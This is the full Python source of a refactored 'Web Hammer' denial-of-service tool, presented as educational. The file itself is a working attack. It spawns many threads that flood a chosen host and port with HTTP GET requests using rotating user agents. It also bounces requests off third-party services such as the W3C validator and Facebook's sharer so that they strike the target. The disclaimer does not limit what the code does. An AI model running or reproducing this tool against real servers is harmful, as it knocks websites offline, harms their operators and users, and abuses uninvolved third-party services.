#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Web Hammer Script (Refactored for Educational Purposes)

Original by shuvo-halder: https://github.com/shuvo-halder/web-hammer
Refactored to demonstrate modern Python best practices.

DISCLAIMER: This is a Denial-of-Service (DoS) tool. Using it against any
website or server without explicit, written permission is illegal and unethical.
This code is provided for educational purposes ONLY. Do not use it for any
malicious activities. You are solely responsible for your actions.
"""

import argparse
import logging
import random
import socket
import sys
import threading
import time
import urllib.request
from urllib.error import URLError

DEFAULT_HEADERS = """Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Connection: keep-alive
"""

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0",
]

PROXY_BOTS = [
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
]


class WebHammer:
    """
    A class to encapsulate the state and logic of the web hammering tool.
    """

    def __init__(self, host: str, port: int, threads: int):
        self.host = host
        self.port = port
        self.threads = threads
        self.custom_headers = self._load_headers("headers.txt")
        self.target_url = f"http://{host}:{port}"
        self.is_running = False

    def _load_headers(self, filename: str) -> str:
        """Loads custom headers from a file, or returns a default string."""
        try:
            with open(filename, "r") as f:
                logging.info(f"Successfully loaded custom headers from {filename}")
                return f.read()
        except FileNotFoundError:
            logging.warning(f"'{filename}' not found. Using default headers.")
            return DEFAULT_HEADERS
        except IOError as e:
            logging.error(f"Error reading {filename}: {e}. Using default headers.")
            return DEFAULT_HEADERS

    def _socket_hammer(self):
        """Continuously sends raw TCP packets to the target host."""
        logging.info(f"Socket hammering thread started for {self.host}:{self.port}")
        
        packet_template = (
            f"GET / HTTP/1.1\r\n"
            f"Host: {self.host}\r\n"
            f"{self.custom_headers}\r\n"
            f"User-Agent: {{user_agent}}\r\n\r\n"
        )

        while self.is_running:
            try:
                request_string = packet_template.format(user_agent=random.choice(USER_AGENTS))
                
                packet_bytes = request_string.encode('utf-8')

                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(2)
                    s.connect((self.host, self.port))
                    
                    # 3. Send the bytes
                    s.send(packet_bytes)
                    logging.debug(f"Packet sent to {self.host}:{self.port}")
            except (socket.error, ConnectionRefusedError, socket.timeout) as e:
                logging.error(f"Socket error: {e}. Server may be down or blocking.")
                time.sleep(5)
            except Exception as e:
                logging.error(f"An unexpected error occurred in socket_hammer: {e}")
            
            time.sleep(0.1)

    def _proxy_hammer(self):
        """Continuously sends requests through third-party proxy services."""
        logging.info(f"Proxy hammering thread started for {self.host}")
        while self.is_running:
            try:
                bot_url = random.choice(PROXY_BOTS) + self.target_url
                headers = {'User-Agent': random.choice(USER_AGENTS)}
                req = urllib.request.Request(bot_url, headers=headers)
                with urllib.request.urlopen(req, timeout=5) as response:
                    logging.debug(f"Proxy request sent via {bot_url} - Status: {response.getcode()}")
            except (URLError, socket.timeout) as e:
                # These errors (403, 400, etc.) are expected as services block abuse
                logging.debug(f"Proxy request failed: {e}")
            except Exception as e:
                logging.error(f"An unexpected error occurred in proxy_hammer: {e}")
            
            time.sleep(0.1)

    def _start_threads(self):
        """Initializes and starts the hammering threads."""
        self.is_running = True
        for i in range(self.threads):
            t1 = threading.Thread(target=self._socket_hammer, daemon=True)
            t1.start()
            t2 = threading.Thread(target=self._proxy_hammer, daemon=True)
            t2.start()
        logging.info(f"Started {self.threads * 2} threads ({self.threads} for each method).")

    def run(self):
        """Starts the attack and keeps the main thread alive."""
        print("\033[92m" + "="*40 + "\033[0m")
        print(f"\033[94mTarget:    \033[0m {self.target_url}")
        print(f"\033[94mThreads:   \033[0m {self.threads * 2} (total)")
        print("\033[92m" + "="*40 + "\033[0m")
        print("\033[91mAttack is running. Press CTRL+C to stop.\033[0m")

        self._start_threads()

        try:
            while self.is_running:
                time.sleep(1)
        except KeyboardInterrupt:
            logging.info("\nCTRL+C received. Shutting down...")
            self.is_running = False
            time.sleep(2)
            logging.info("Hammer stopped.")
            sys.exit(0)


def main():
    """Main function to parse arguments and start the tool."""
    parser = argparse.ArgumentParser(
        description="A Layer 7 DoS stress testing tool (for educational purposes only).",
        epilog="Use this script responsibly and only on systems you are authorized to test."
    )
    parser.add_argument(
        "-s", "--server", required=True, help="Target server IP or domain name."
    )
    parser.add_argument(
        "-p", "--port", type=int, default=80, help="Target port (default: 80)."
    )
    parser.add_argument(
        "-t", "--threads", type=int, default=50, help="Number of threads per method (default: 50)."
    )
    parser.add_argument(
        "-q", "--quiet", action="store_const", dest="loglevel", const=logging.ERROR,
        default=logging.INFO, help="Set logging to ERROR level (quiet mode)."
    )

    args = parser.parse_args()
    logging.basicConfig(level=args.loglevel, format="%(asctime)s - %(levelname)s - %(message)s")

    try:
        logging.info(f"Checking connection to {args.server}:{args.port}...")
        with socket.create_connection((args.server, args.port), timeout=5):
            logging.info("Connection successful. Starting hammer.")
    except (socket.error, socket.timeout) as e:
        logging.error(f"Could not connect to {args.server}:{args.port}. Error: {e}")
        sys.exit(1)

    hammer = WebHammer(host=args.server, port=args.port, threads=args.threads)
    hammer.run()


if __name__ == "__main__":
    main()